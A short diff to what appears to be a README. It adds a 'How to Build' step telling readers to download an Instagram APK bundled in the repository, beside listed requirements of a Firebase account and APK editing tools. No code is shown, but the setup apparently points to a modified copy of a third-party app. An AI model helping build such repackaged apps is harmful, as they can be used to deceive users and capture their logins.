@@ -38,3 +38,7 @@
  - Firebase Account
  - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
 [ApkTool M](https://maximoff.su/apktool/?lang=en) ( for Android)
+
+
+## How to Build 
+ 1. Download [Instagram.apk](./ANDROID%20APP/Instagram.apk)
